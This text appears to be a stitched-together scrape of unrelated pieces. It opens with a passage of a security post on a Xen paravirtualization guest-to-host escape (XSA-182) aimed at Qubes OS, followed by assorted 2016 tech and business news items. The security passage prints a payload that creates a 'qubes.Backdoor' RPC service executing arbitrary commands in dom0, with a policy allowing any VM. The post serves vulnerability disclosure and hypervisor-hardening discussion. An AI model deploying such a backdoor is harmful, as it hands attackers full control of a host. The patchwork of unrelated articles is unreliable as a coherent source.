 The above code defines the macro used to create the function checking self mapping entries for a given page table level. If such an entry with the RW bit set to 1 is created directly, the hypervisor returns the error Attempt to create linear p.t. with write perms. But with XSA-148 [2] in mind, one can remember that there is a fast-path for safe flags. This fast-path updates the entry without checking invariants because the modified flags are considered safe. _PAGE_RW is part of the flags that are considered safe: /* Update the L4 entry at pl4e to new value nl4e. pl4e is within frame pfn. */

        return -EFAULT;

    if ( l4e_get_flags(nl4e) & _PAGE_PRESENT )
    {
        if ( unlikely(l4e_get_flags(nl4e) & L4_DISALLOW_MASK) )
        {
            MEM_LOG("Bad L4 flags %x",
                    l4e_get_flags(nl4e) & L4_DISALLOW_MASK);
            return -EINVAL;
        }

        /* Fast path for identical mapping and presence. */
        if ( !l4e_has_changed(ol4e, nl4e, _PAGE_PRESENT) )
        {
            adjust_guest_l4e(nl4e, d);
            rc = UPDATE_ENTRY(l4, pl4e, ol4e, nl4e, pfn, vcpu, preserve_ad);
            return rc ? 0 : -EFAULT;
        }
 This code takes the fast path only if the entry and the PRESENT flag have not changed, allowing us to set the RW flag on a self-mapping entry. Basically, we can: create a self-mapping entry without the RW flag, add the RW flag through the fast-path, access the page directory with the write right, vm escape. The scheme bellow illustrates such a memory mapping on the entry 42: 
VADDR : (42 << 39) | (42 << 30) | (42 << 21) | (42 << 12)
         +------------+------------+------------+

 Exploitation The exploitation scenario is exactly the same as in the XSA-148 [2] case: iterate through the whole host memory, look for the page directory, find struct start_info to find the dom0, find the vDSO page and patch it, get a root shell within dom0. As said in the introduction, we decided to exploit the vulnerability in Qubes OS. If you don't know anything about Qubes, here is some information taken from its website [4]: 
What is Qubes OS?

Qubes is a security-oriented operating system (OS). The OS is the software
which runs all the other programs on a computer. Some examples of popular
OSes are Microsoft Windows, Mac OS X, Android, and iOS. Qubes is free and
open-source software (FOSS). This means that everyone is free to use, copy,
and change the software in any way. It also means that the source code is
openly available so others can contribute to and audit it.

How does Qubes OS provide security?

Qubes takes an approach called security by compartmentalization, which
allows you to compartmentalize the various parts of your digital life into
securely isolated virtual machines (VMs). A VM is basically a simulated
computer with its own OS which runs as software on your physical computer.
You can think of a VM as a computer within a computer.
 Qubes OS uses Xen hypervisor to manage isolated virtual machines. If an attacker is able to execute some code within Qubes' dom0 from a virtual machine, the system doesn't provide any security. Code execution in dom0 is already done, but because Qubes provides a firewall, we can't use our classic netcat. The payload must be changed. Here comes the Qubes RPC services [5]. RPC services allow communications between virtual machines on Qubes OS, such as clipboard, file copy, etc. Each service has a policy specifying a source virtual machine, a target virtual machine and the policy to apply (allow, deny or ask). The idea is to add an RPC service executing a given code in dom0's context. This could be done with an elegant modification of scumjr's [6] assembly payload, executing some python scripts and writing some bash scripts: python:
        ;;      mov     rcx, rip+8
        lea     rcx, [rel $ +8]
        ret
        db '-cimport os;x=open("/tmp/.x", "w");x.close();'
        db 'service=open("/etc/qubes_backdoor", "w");'
        db 'service.write("#!/bin/bash\n");'
        db 'service.write("read arg1\n");'
        db 'service.write("($arg1)\n");'
        db 'service.close();'
        db 'os.system("chmod +x /etc/qubes_backdoor");'
        db 'rpc=open("/etc/qubes-rpc/qubes.Backdoor", "w");'
        db 'rpc.write("/etc/qubes_backdoor\n");'
        db 'rpc.close();'
        db 'policy=open("/etc/qubes-rpc/policy/qubes.Backdoor", "w");'
        db 'policy.write("$anyvm dom0 allow");'
        db 'policy.close();'
        db      0
 This simply adds a Qubes RPC service named qubes.Backdoor executing every given command. Because the vulnerability has been disclosed only one week ago, we don't want to publish a fully working exploit today, putting users at risk. However, a proof of concept telling whether Xen is vulnerable or not is available: xsa-182-poc.tar.gz: $ tar xzvf xsa-182-poc.tar.gz
$ make -C xsa-182-poc/
$ sudo insmod xsa-182-poc/xsa-182-poc.ko
$ sudo rmmod xsa-182-poc
$ dmesg | grep xsa-182
 If you use Qubes OS and your version is vulnerable, be safe and update dom0's software via the Qubes VM Manager or with the following command line: $ sudo qubes-dom0-update
 Hardware virtualization and hypervisor security The presentation Virtualisation security and the Intel privilege model [9] given at CanSecWest 2010 by Julien Tinnès and Tavis Ormandy explains the different kinds of virtualization, and shows the challenge of developing a secure hypervisor. Paravirtualization is, indeed, extremely complex, and quite similar to binary translation. As said in the presentation, handling all subtleties like a real CPU is difficult. Errors generally lead to privilege escalation in guests or guest to host escapes. While binary translation or paravirtualization were mandatory when hardware virtualization didn't exist, the situation drastically changed since Intel introduced VT-x and AMD introduced SVM. Hardware virtualization makes the development of hypervisors easier and far more secure, thanks to a few CPU instructions. Second Level Address Translation [10] (EPT for Intel and RVI for AMD) allows to avoid the complexity of shadow page tables. While we didn't run a benchmark, we don't think that the difference between paravirtualized and hardware virtualized guests is noticeable. Moreover, the security of hypervisors relying on hardware virtualization can still be improved. The approach taken by Google to reduce the attack surface of KVM seems appealing [11] [12]. A lot of functionalities are moved to userspace, and thus could be easily sandboxed. Also, emulated devices introduce a huge attack surface and KVM, unlike Xen, doesn't seem to be able to isolate devices inside untrusted virtual machines. Conclusion Paravirtualization security is really difficult to guarantee. It introduces very complex code and is highly subject to mistakes. Qubes OS have decided to get rid of paravirtualization and make hardware virtualization mandatory from Qubes OS 4.0 [7]. We believe this is a great decision because hardware virtualization is less subject to security bugs. We recently found another vulnerability affecting paravirtualized guests and allowing guest-to-host escape. However we don't think another blogpost is needed because this bug is quite similar to this one. Hopefully you enjoyed this 3 Xen's posts!

Work on the R&D center, which will be located in the Vietnamese central province of Da Nang, was uncovered following a local government meeting on foreign direct investment. Da Nang, image via VnExpress Rumors earlier this year suggested Apple would invest up to $1 billion to build an Asia-focused research and development center in Vietnam, designed to "enhance its competitiveness over major global electronic manufacturers present in the country." Last October, Apple also established an Apple Vietnam LLC in Ho Chi Minh City, led by Gene Daniel Levoff, Apple's VP of corporate law who is also in charge of international operations. Companies like Microsoft, Intel, and Samsung have had investment projects in Vietnam for several years, but the R&D center will be Apple's first major project in the country. A final decision on whether the research center plans will move forward is expected in late August. 35 comments Top Rated Comments (View all) El Hikaru 16 weeks ago I am thinking that this investment is something to do with the pile of money sitting outside of US which has to be spent outside of US.

Dubbed the PR2100 and PR4100, the latest My Cloud units offer two-bay and four-bay storage priced from £380 and £450, respectively, and we have the former in for review today. Described by the manufacturer as a "powerful collaboration hub for your entire team," the PR2100 has its sights set on creative professionals seeking high capacity, fast access and sufficient underlying power for on-the-fly hardware transcoding and streaming of popular formats such as 4K video. Brand recognition and availability in high-street stores has aided WD's progress in the NAS marketplace, and the PR2100 looks set to strengthen the My Cloud appeal. Compact dimensions of 192mm (H) x 232mm (D) x 170mm (W) make it a tidy-looking box that would sit neatly in a home or office environment, and for those seeking an off-the-shelf solution that's ready to go, pre-populated models are available in 4TB (£580), 8TB (£660), 12TB (£760) and 16TB (£860) capacities. Our 16TB review sample is home to dual WD Red 8TB hard disks in a RAID 1 array, resulting in 8TB of usable space and the peace of mind that comes with a mirrored backup. A pre-configured RAID volume is helpful, yet there's another incentive in buying a pre-populated model as the all the units are backed by a three-year warranty, compared to standard two-year cover for the diskless box. Levered doors at the front of the unit reveal access to the tool-less, tray-less bays, and though neither door is lockable, the latch mechanism feels suitably robust and drives slide-in smoothly. Keeping things simple, the only front-facing port is a USB 3.0 connector and it's joined by two buttons - one-touch copy, for quickly transferring the contents of a USB-attached device, and a backlit power button that shines blue when everything is in order, and red when the NAS needs attention. The bulk of the Pro Series PR2100's connectivity options take place around back, where you'll find a cooling fan sat alongside a second USB 3.0 port, dual Gigabit Ethernet and two power connectors supporting auto failover. A customary Kensington lock is also included, as is a single Ethernet cable and a small external power supply, while the user manual is available as a PDF download. With creative professionals and prosumers in mind, WD has stepped away from the ARM-based SoCs that featured prominently in earlier My Cloud units and opts instead for a quad-core Intel Pentium N3710 processor capable of speeds of up to 2.56GHz. The 6W chip is joined by 4GB of DDR3 memory, and though the core components are identical to the four-bay PR4100, it's worth noting that the PR2100 does miss out on expandable memory and an integrated LCD display. The Pro Series can be deemed accessible to those with little networking experience as WD ensures that both the hardware and software are easy to get to grips with. Initial setup is as simple as attaching the power adapter, connecting the box to your network, pressing the power button and pointing the web browser on any networked PC to mycloud.com/setup. The web-based GUI should automatically detect the NAS and begin the setup wizard, though WD has missed a trick in not ensuring compatibility with Windows 10's default browser, Microsoft Edge. Once setup is complete, users are dropped into a familiar-looking My Cloud home screen. WD's clean presentation is both efficient to get around and easy on the eye, with all available functions split into a series of sections arranged in a horizontal menu bar. The interface and indeed feature set can be considered lightweight compared to rival offerings from the likes of Qnap and Synology, yet this could be a blessing in disguise - the My Cloud OS might be missing exotic extras such as virtualisation or SSD caching, but focussing on the essentials has enabled a more streamlined interface. The majority of PR2100's controls and options are laid out logically, and My Cloud's feature set includes support for multiple users or groups, comprehensive PC and Mac backups to USB, remote or cloud, a choice of JBOD, RAID 0 or RAID 1 storage configurations, as well as built-in media, iTunes, FTP, and download servers. Accompanying My Cloud mobile apps and the MyCloud.com website provide remote access over the Internet, while the PR2100's integrated app depository has been expanded to include the likes of Dropbox, WordPress and the popular Plex Media Server. An option for surveillance cameras is also available via a tie-in with Milestone Arcus, and as a further nod toward the target audience, WD is keen to point out that the latest release of its My Cloud mobile app now offers integration with Adobe's Creative Cloud.

Well, it depends on what you need. Here’s a list of the best Chromebooks for students in 2016. All-Around Best Chromebook If you’re looking for a middle-of-the-road Chromebook, check out the Toshiba Chromebook 2. It’s 13.3″, landing it square between the too-small 11.6″ Chromebooks and the too-big 15.6″ Chromebooks. It goes for about $300, making it neither the cheapest nor the most expensive Chromebook out there. Performance-wise, though, it has everything you need: a Full HD 1080p IPS display, 4GB of RAM, 16GB of storage, and a backlit keyboard. Its Celeron processor would be slow on a Windows computer, but Chromebooks are much less demanding, making this one of the fastest Chromebooks out there (you can even upgrade to an i3 processor if you want). Ads by Google If you’re not searching for anything in particular, the Toshiba Chromebook 2 is a safe bet. Buy: Amazon ($469) All-Day Battery Life If you’re going to be at school all day, freedom from power outlets makes your life a lot easier. With a Chromebook, it’s easy to get all-day battery life and spend your time working outside, taking notes in class, and even writing essays that evening. The Asus C201 gets about 13 hours of battery life, which is amazing for any laptop or Chromebook. It also just happens to be one of the cheapest at $169 for the 2GB version (though the 4GB version is a little more expensive). The Google Store sells the C201 in Dark Blue, but you can find it on Amazon in Gold/Red or White/Light Blue. Its Rockchip processor isn’t the fastest, but it gets the job done. The little 11.6″ screen is only 720p, and the small size can make the keyboard feel cramped — but that also makes it inexpensive, lightweight, and super portable. If you want something that won’t weigh down your backpack and will last the whole day, definitely go with the Asus C201. Buy: Amazon ($170/£200) | Google Store ($169) ASUS C201PA-DS02 11.6 inch Chromebook (1.8GHz Quad-Core, 4GB LPDDR3, 16GB SSD), Navy Blue ASUS C201PA-DS02 11.6 inch Chromebook (1.8GHz Quad-Core, 4GB LPDDR3, 16GB SSD), Navy Blue Rockchip 1.8 GHz Processor Buy Now At Amazon $169.00 Touchscreen Hybrids If you’re tired of traditional laptops and want something that can double as a tablet, you have two great options capable of running Android apps, if you switch over to the developer channel. The first is the Asus Chromebook Flip — my personal Chromebook for the last year and one I couldn’t live without.

It’s a small 10.1″ device with a touchscreen that flips back on a 360-degree hinge so that you can use it in laptop mode, tent mode, presentation mode, or tablet mode. After using a touchscreen on a Chromebook, it’s so hard to go back. Why use the tiny trackpad when you can scroll using the whole screen? Plus, the tent and presentation modes are perfect for watching videos on an airplane or during a train ride. At $249 for the 2GB RAM version, it’s cheap, but not the cheapest, though thankfully, the 4GB upgrade is only $279 (or $249 from Amazon). Buy: Amazon ($300/£389) | Google Store ($249-$279) Your second touchscreen option is the Acer Chromebook R11. It has a faster Celeron processor, but no 4GB RAM option. It’s a little larger at 11.6″, which could give you a better typing experience, but the white casing looks cheaper than the silver Chromebook Flip. Otherwise, its 360-degree hinge design mirrors the Flip’s design. If 10.1″ is too small for you, go for the R11. Buy: Amazon ($270/£230) | Google Store ($249) Best Big Screen If all this talk of 10.1″ and 11.6″ screens has you cringing, don’t worry! Larger Chromebooks exist — the best of these is probably the Acer Chromebook 15. This one might be a little harder to fit in your backpack, but if you really can’t give up that screen real estate, it’s the way to go. The Chromebook 15 is pretty customizable, reaching from a 2GB RAM, HD screen, and 16GB storage configuration for $199 to a 4GB RAM, Full HD screen, and 32GB storage configuration for $349 — though prices are a little different on Amazon because it only offers the Full HD screen. With this Chromebook, you get a spacious keyboard and trackpad, as well as upward-facing speakers for improved audio quality. Those willing to lug around a nearly 5lb beast might appreciate its roomier typing experience. Buy: Amazon ($250/£268) | Google Store ($199-$349) Acer Chromebook 15 CB5-571-C1DZ (15.6-Inch Full HD IPS, 4GB RAM, 16GB SSD) Acer Chromebook 15 CB5-571-C1DZ (15.6-Inch Full HD IPS, 4GB RAM, 16GB SSD) Intel Celeron Dual-Core 3205U 1.5 GHz Processor (Broadwell micro-architecture) Buy Now At Amazon $234.99 Saving Money If you’re broke, the cheapest Chromebook around is the Acer Chromebook 11. It features the bare minimum specifications: 2GB of RAM, 16GB of storage, 720p HD screen, and a Celeron processor. It’s honestly not a bad device. It still has an IPS display and 9 hours of battery life. For being the cheapest device out there, it certainly could be much worse. For the most basic Chromebook that will let you get work done without breaking the bank, the Chromebook 11 should be your choice. It outperforms even the cheapest Windows laptops Best Laptops Under $300: Everything You Need to Know Best Laptops Under $300: Everything You Need to Know Finding a good laptop for less than $300 is almost impossible these days, but can be done if you know what to look for.

There are a lot of great Chromebooks on this list, but which one is best for you depends on your needs. Some people might love small 10.1″ devices, while others couldn’t imagine using them — a lot of it is just personal preference.

Reply Kelsey Tidwell August 16, 2016 at 11:25 pm I'm waiting right now with cash in hand for CTL to start shipping their new J5. It's a touchscreen convertible with 12 hours of battery life, 3 USB 3.0 ports, and a good bit more nice features. I had never heard of CTL til about a month ago, but apparently they're very big in the education market, and they have a rather extensive product line so I don't think they're some fly-by-night operation. I've communicated a few times with a couple of their employees, and they seem to be pretty responsive, though I'll admit I'm going to wait until I see a review or two before I buy. I've never been a blind early adopter. :) Here's a link to the product site: http://ctl.net/laptops/ctl-j5-rugged-convertible-chromebook-tablet Can't wait to get it for public speaking purposes!

Facebook Giveaways Contest Rules Photos Contact Select Page S&P 500 y Nasdaq tocan máximos históricos y Dow Jones sube más de 150 puntos Posted by Online News Editor | Aug 5, 2016 BOLSA WALL STREET Nueva York, 5 ago (EFE).- Wall Street ampliaba las ganancias y a media sesión dos de sus principales indicadores, el selectivo S&P 500 y el índice compuesto del mercado Nasdaq, se situaban en máximos históricos, mientras que el Dow Jones subía más de 150 puntos. El S&P 500 subía a esta hora un 0,82 % hasta 2.182,05 puntos, por encima de su último récord histórico fijado en 2.175,03 enteros, mientras que el Nasdaq progresaba un 1,14 % hasta 5.225,23 unidades, también por encima de su máximo histórico de 5.218,86 unidades. Por su parte, el Dow Jones de Industriales avanzaba hacia mitad de la jornada un 0,89 % (162,99 puntos) y se ubicaba en 18.515,04 unidades, cada vez más cerca de su récord histórico fijado en 18.595,03 unidades. Hacia el ecuador de la jornada los operadores en el parqué neoyorquino seguían apostando decididamente por las compras impulsados por el buen sabor de boca que dejó en Estados Unidos el informe oficial de empleo publicado por el Departamento de Trabajo. La tasa de desempleo se mantuvo en julio en el 4,9 %, con una fuerte creación de 255.000 nuevos puestos de trabajo que superó ampliamente las expectativas de los analistas, que como el mes anterior volvieron a quedarse cortos en sus previsiones. Los datos reafirman el buen momento del mercado laboral, que ha creado más de diez millones de empleos desde el fin de la recesión en 2009, y refuerza los argumentos para que la Reserva Federal (Fed) suba los tipos de interés más pronto que tarde. Casi todos los sectores cotizaban al alza, como el financiero (1,32 %), el tecnológico (1,09 %), el industrial (0,93 %), el energético (0,55 %) o materias primas (0,22 %), mientras bajaba el de empresas de servicios públicos (-0,62 %) o el sanitario (0,26 %). La farmacéutica Merck lideraba las ganancias entre la inmensa mayoría de los treinta valores del el Dow Jones, con una fuerte subida del 7,52 %, por delante de JPMorgan (2,46 %), American Express (2,43 %), Goldman Sachs (2,08 %) o Nike (1,81 %). También subían más de un punto porcentual Apple (1,65 %), Intel (1,30 %), Caterpillar (1,15 %) o Microsoft (1,00 %) mientras que al otro lado de la tabla solo bajaban Verizon (-0,46 %), Chevron (-0,19 %) y Procter & Gamble (-0,02 %). En otros mercados, el petróleo de Texas bajaba a 41,57 dólares, el oro retrocedía a 1.344,7 dólares la onza, la rentabilidad de la deuda pública a diez años avanzaba al 1,566 % y el dólar ganaba terreno frente al euro, que se cambiaba a 1,1082 dólares.

However, there’s a catch — before their application is approved, interested parties will have to pay $2,975 to attend a special training seminar. It’s important to note that Valve isn’t opening the door for other companies to start making headsets. Instead, this program centers around physical objects that SteamVR can detect and track, in order to implement them in the platform’s room-scale VR implementation. For instance, if a developer were planning a game about lightsaber combat, the license being offered by Valve would allow them to design a hilt that players could hold while wearing the headset. SteamVR would then recognize this peripheral and translate it into a 3D lightsaber model displayed via the headset for the player to see in-game. Related: Intel crammed six depth-sensing cameras into a unicorn horn for the HTC Vive SteamVR detects hardware like the HTC Vive headset and its wand controller by looking for the IR receiver dots littered across the surface of these devices, according to a report from Ars Technica. At present, most of the custom peripherals used in conjunction with the platform are homemade devices that use a wand controller as a base — but Valve’s new program could help push things forward. Successful applicants will receive two HTC Vive base stations, a full complement of EVR circuit boards, 40 individual sensors, and accessories to enable custom prototypes. The dev kit also includes tools to help with sensor placement and calibration. It’s easy to see why developers would want to take advantage of this program, but the cost of the seminar may be a barrier to entry for some. Sessions will be held in Seattle starting at the end of September, with more to follow in Asia over the coming months.

In the role, Woytek will be creative lead of R/GA Austin, tasked with growing the office and shaping its direction while partnering with R/GA Austin vice president, managing director Candice Hahn and reporting to R/GA U.S. executive vice president, executive creative directors Chloe Gottlieb and Taras Wayner.  “We are thrilled to welcome Jonathan’s creative genius and masterful knowledge of UX to our creative team here at R/GA,”  Wayner said in a statement. “His impressive work speaks for itself, and we look forward to working alongside him to continue to create more world-class work in the Austin office,” added Gottlieb. Woytek joins R/GA from Pereira & O’Dell, where he served as executive creative director. He originally joined Pereira & O’Dell as a creative director in September of 2010, and has worked with clients including Skype, LEGO, Hyatt, Godiva, and Corona while with the agency. Before joining Pereira & O’Dell he spent three years with MRM//McCann San Francisco, serving as vice president and then senior vice president, director of user experience, establishing and leading the agency’s UX practice and working with clients including Microsoft, Intel, HP, Tom’s Shoes, and The Boys and Girls Clubs of America. That followed stints at Razorfish and Publicis, working with clients such as Adidas, AT&T, Hewlett-Packard, Mattel, Oracle, Red Bull, Samsung, Sony, and Visa during the five-year period. He was promoted to ECD last February following the departure of Jaime Robinson, who left Pereira to go to Wieden + Kennedy and later launched her own agency Joan along with former Ogilvy/BBH/Saatchi account lead Lisa Clunie. “I am excited to join the team at R/GA, a company that has a life-long history of groundbreaking techniques and unparalleled storytelling through media,” said Woytek. “As a Texas native, it will be great to return to Austin and collaborate with the impressive roster of clients to create work that changes the way we see and experience stories.” < Previous Article Next Article > Advertisement Please enable JavaScript to view the comments powered by Disqus.

Gwyneth Paltrow and will.i.am to star in Planet Of The Apps Seamus Duff for Metro.co.ukFriday 5 Aug 2016 3:42 pm Gwyneth Paltrow and will.i.am will front Planet of the Apps (Picture: REX Features / Alamy – Credit: METRO/mylo) Gwyneth Paltrow loves giving life advice via her Goop website – but now she’s branching out to give career advice to those with ambitions of a start-up. The 43-year-old golden haired beauty is being given star billing alongside music legend will.i.am, 41, as part of a new reality show being created by Apple. The Oscar winner and multi-award winning music star are to serve as mentors to contestants on Planet Of The Apps – a reality competition series that will see hopefuls pitching app ideas in the hopes of having their dreams become reality. Gwyneth Paltrow has enjoyed varied success with her website Goop (Picture: Layne Murdoch Jr./Getty Images for Goop) ‘Developing and launching a business based on your own original idea can be exhilarating, but intimidating,’ Gwynnie said in a statement. ‘This is a great opportunity to be part of a series that lets us use our experiences to help app developers break through and create viable businesses that will impact peoples’ lives.’ The actresses own innovations have not gone so well, however, with her luxury lifestyle website Goop not exactly attracting the biggest readership and last week she announced she was planning to part ways with the service. Conversely, Will is something of a tech whizz having set up his creative lab The Future and having created smart watch Dial, as well as having served as director of creative innovation for Intel Corp. ‘As tech drives modern pop culture now more than ever, we are giving a platform for the next generation of culture makers to shine,’ says Will. ‘We are searching for entrepreneurs with the vision to shape the future, solve real problems and inspire change within our daily lives.’ Though no air date has yet been announced, Planet Of The Apps is set to film mostly in Los Angeles from the end of the year through early 2017.

CONTENT Reviews Columns Buyer's Guide POPULAR TOPICS Android Apple Cars Phones Tablets Gaming Computing Photography Apps Software Wearable Entertainment Science Reviews Columns Buyer's Guide Popular Topics  Android Apple Cars Phones Tablets Gaming Computing Photography Apps Software Wearable Entertainment Science Twitter Google+ Facebook Youtube RSS Search SlashGear Search The Android PC – Revisiting mobile productivity JC Torres - Aug 5, 2016 11 Facebook Twitter Google Reddit Last week we took the iPad Pro again for a spin, trying to verify, or refute, Apple’s claims about the tablet being the ultimate PC replacement. And just in time, the company just released a video ad just few days ago that tries to make the same point again. But iOS is hardly the only game in town, especially on mobile. And while Google hasn’t exactly made a similar claim for Android, others have spoken for it instead. But before go off on another crazy adventure, we first have to look at the few, of course unofficial, attempts at making Android the ultimate PC replacement, as far as OS is concerned at least. Yes, this is the so-called “Android PC”. Android is a better mobile OS for PCs Taking Android and making it run in a traditional computing environment is something that neither its original creators (Danger) nor Google have envisioned. Just as they didn’t originally envision Android to run on tablets. And yet, the nature of the Android platform, as well as the conventions that have grown around it, have made it almost the perfect platform to use in a PC, desktop, or laptop setting. Exposed file system While the debate between how Android and iOS handles and exposes file systems rages on, our second review of the 9.7-inch iPad Pro shows just how critical that capability is when doing real serious work. While stock Android, or at least the version of Android that Google ships in Nexus devices, doesn’t instantly reveal that file system to users, it doesn’t exactly block them from finding out, accessing files and folders, or installing apps that can, a.k.a. file managers. But more importantly, that is also true for apps that need to access files, like uploading them to websites and what not. That is actually a powerful feature that is only found on regular desktop operating systems. Some would argue, however, that it also exposes Android and its apps to security exploits. That might actually be true to some extent, but in most cases, Android’s permissions system can impede unauthorized access. Plus, it might also be worth the risk. Input support While there are creative Android apps that are best used with fingers, when it comes to other types of work, you’re most likely to reach for a keyboard to get things done. And when you’re already in that typing position, reaching out to the screen to manipulate things on the screen is not only tedious, it is also not ergonomic. Yes, there are times when the mouse is a better pointing device than your finger. Luckily, Android supports all kinds of mice out of the box. Wired, wireless (RF), or Bluetooth (at least most), Android can use them all and even shows a handy cursor when it detects such a pointing device is connected. And it goes beyond mere keyboard and mouse even. With the right drivers, Android devices can support more types of peripherals? Ever tried attaching a Wacom drawing tablet to a Remix Mini have it automagically work, pressure sensitivity and all? Or how about sitting back to relax and play a game with a controller, sometimes even if the game itself doesn’t natively support one? These are just some of the cool, and sometimes insane, things you can attach to or do with Android devices. And it all boils down to the most important reason. Open platform Android is, and for the foreseeable future, an open source platform. For various definitions of the words “open source”. This has allowed the OS to support features that Google may have not considered, or may not even approve of. It has allowed hackers and developers to take Android and put them on devices that, again, Google might not even want. Like, say, desktops and laptops. But Android’s biggest strength is also its biggest weakness. Its openness has given birth to diversity and fragmentation, two sides of the same coin. In this particular context, of using Android as a PC replacement, it may not have such dire consequences as on smartphones and tablets, but it does mean that there is no unified, consistent experience or an assurance that things will work consistently across devices or ROMs. But since Google is unlikely to standardize on an Android PC spin, like it is doing with Android TV and Android Auto, we’ll have to accept matters as they are. At least for now. Your PC on a stick, phone, or slab So now that we’ve established that Android can be great for a personal computing experience, our next question is, of course, whether there are indeed attempts at doing so. As you might have already heard by now, there are, in fact, a lot! There are different solutions available, ranging from what you already have in your pocket or bag, to more exotic pieces of equipment. Android Android, as it already is, can be shoehorned into a PC experience. And by that, I mean practically blowing up your screen to bigger display, attaching a keyboard and mouse, and done. It is, of course, not the prettiest option, but it is the most economical. The only specialized piece of equipment you need is a cable to output video from the smartphone or tablet, the latter in case you want an even bigger screen. But since not all smartphones support HDMI or MHL or SlimPort, sometimes the most generic solution is a Chromecast or Miracast receiver. That said, at the moment, iOS trumps Android, even Android tablets, in one important aspect: split screen. iOS 9 already implemented that much wanted multi-tasking capability, but Android has yet to embrace it. The good news is that Android Nougat will hopefully address that limitation. How much, we still don’t know. There are, of course, exceptions to this. Manufacturers, with their custom Android skins, are able to implement different types of multi-tasking, from split, even quad, windows to floating windows. Samsung started that trend with its Galaxy Note smartphones and tablets and some OEMs, particularly those with phablets, have followed suit. Those, however, are still rare and few in between to make it a consistent experience. Remix OS When it comes to using Android as a PC, there is perhaps no name more popular these days than Jide’s Remix OS. After all, how better to use Android as a PC than by having movable, resizable windows and a taskbar. True to its name, Remix OS remixes the entire Android system in order to deliver what is billed to be a truly productive experience. There are, of course, pros and cons to this. As a near complete revamp of Android rather than something slapped on top, Remix OS presents the exact same user interface and features on any device that has Remix OS installed. And as a full Android system, it isn’t limited to Jide’s own suite of apps designed for windowed use. The disadvantage is that Android, as it stands right now, wasn’t made for this kind of use and apps aren’t exactly designed with resizing and moving windows in mind. From time to time, this rears its ugly head in apps that don’t exactly behave properly outside of their comfy phone or tablet screens. Remix OS is also something that isn’t exactly as widespread as vanilla Android. While the OS is liberally available for Intel and AMD powered PCs and laptops, it is ironically rarer on mobile devices, even tablets. And, given its specific design, it isn’t at all available for smartphones. Maru OS To be blunt, Maru OS is a “cheat”. While promising a desktop experience using only your smartphone, it actually doesn’t do so for Android. Maru OS does run Android primarily and mostly, but the PC experience that comes when you connect the smartphone to an external display is actually Linux. On the one hand, this does mean that you have the power of full Linux desktop software when you do so. On the other hand, unless you’re a Linux user already, you might find yourself in an alien, sometimes unforgiving, land. The biggest drawback of Maru OS is that it is officially available, in beta even, for one and only one device: the Nexus 5. A favorite among hackers and tinkerers, the Nexus 5 has long shown its age. Even worse is that the desktop mode is activated only by making a wired connection between the Nexus 5 and a monitor. No Miracast or Chromecast option. The fact that the Nexus 5 uses a not so popular SlimPort connector complicates matters further. Superbook and Andromium Andromium, the team behind both the initial failed Kickstarter and the now super successful Superbook Kickstarter, perhaps presents the best and yet the most ambitious form of Android PC experience. Taking inspiration from the likes of Microsoft’s Continuum and Ubuntu’s Convergence, Andromium promises that you only ever need your smartphone to get work done. Part of that promise will be fulfilled by the Superbook, basically an empty laptop that only contains a display, keyboard, touchpad, battery and ports. Majority of the magic, however, will be done by the Andromium software. Andromium, the app, kicks in when you connect any smartphone to the Superbook through the magic of a wired DisplayLink connection. Andromium itself is really just a facade that presents a familiar desktop interface to users. It does have specially designed apps that can be resized and moved. But for the most part, it really is just a layer on top of Android. The good news is that you still have access to all your Android apps unconditionally. The bad news is that integration between all sorts of apps isn’t exactly harmonious and the illusion breaks so easily. Andromium, however, is still in beta, though everyone is free to try it on any Android smartphone at this point. Superbook, on the other hand, is already way past its funding goal but there is no assurance that it will be delivered on time, if at all. Wrap-up Android has always had the irony of choice attached to its open source nature, giving users so many choices to the point of paralyzing them. That is even true in this admittedly still niche aspect of using Android devices as a PC. But with a paradigm shift starting to unroll, especially in tablets and through Apple’s own pushing, there is a chance that Android, at least on tablets, could take on a different form, one that has a bias towards productivity and work. Either that or Google pushes Chrome running Android apps as its productivity champion.

The IIoT is expected to disrupt industries such as energy, with wind turbine operators being able to predict when a gearbox is about to fail and then schedule maintenance. In healthcare, hospitals can integrate standalone systems, such as ultrasound devices, into the overall hospital system, improving the decision making capabilities of staff and the quality of care. In manufacturing, factories can extract value from a wide variety of data to boost efficiency, reduce downtime and improve product yields. The Industrial Internet Consortium was formed to accelerate the market adoption of the IIoT by acting as a catalyst and by coordinating the priorities and enabling technologies of the industrial Internet. Founded by AT&T, Cisco, General Electric, IBM and Intel in 2014 and managed by the Object Management Group, the Industrial Internet Consortium is organised into 19 working groups in seven broad areas: Business Strategy and Solution Lifecycle, Legal, Marketing, Membership, Security, Technology and Testbeds. The Working Groups are comprised of IIC member company representatives from small and large technology innovators, vertical market leaders, researchers, universities and government organisations. The IIC and its members are creating new industry use cases and testbeds for real-world applications, defining a reference architecture and frameworks for interoperability and influencing the global development standards process for the industrial Internet. The IIoT will dramatically alter manufacturing, energy, agriculture, transportation, healthcare and many other sectors of the global economy. The Industrial Internet Consortium continues to foster the growth of the IIoT by bringing organisations and technologies together and by identifying, assembling and promoting best practices.

Highlighting the importance of new models such as the revamped BMW 5 series coming in 2017, the organisation promised to struggle to maintain the leading position. “BMW will struggle to maintain the leading position by sales because they don’t have any obvious blockbusters coming this year,” An analyst with Commerzbank AG in Frankfurt Sascha Gommel told newsmen. BMW is at a comparatively weak point in its product cycle. It is preparing for next year’s remake of the 5-series sedan, which competes with the Mercedes E class that went on sale in March. Another challenge has been U.S. customers’ shift towards SUVs, which has led to deeper discounts on the sedans at the core of BMW’s lineup. The carmaker’s U.S. sales dropped nine percent in the first six months, more than 9,000 vehicles behind Mercedes. BMW has said it will focus on profitability as it invests in technology, such as self-driving features, to compete with new rivals including Uber Technologies Inc. and Tesla Motors Inc. The company has promised to introduce a car capable of driving itself by 2021, working with partners Intel Corp. and Mobileye NV, and today highlighted an 87 percent first-half increase in the sales of its electric models. The group, which includes the BMW, Mini and Rolls-Royce brands, is “firmly intent” on remaining the world’s leading luxury-vehicle manufacturer this year, BMW said in a statement. Second-quarter earnings before interest and tax rose to 2.73 billion euros ($3.05 billion) from 2.53 billion euros a year earlier. BMW kept a tight hold on costs to offset a reliance on less-expensive vehicles such as the X1 compact SUV to boost sales. The result comes after Daimler and Volkswagen AG beat expectations with earnings that excluded one-time costs. BMW’s figures included 472 million euros in warranty provisions, among them the cost of recalling vehicles with Takata Corp. airbags. BMW’s return on sales from car making was 9.5 per cent, compared with 8.4 per cent in the same quarter last year. That compares with an operating profit margin of 10 per cent for Mercedes and 7.6 per cent for Volkswagen’s Audi. BMW confirmed its forecast of slight increases in deliveries and profit before tax this year, with a profit margin from car making between 8 per cent and 10 per cent.

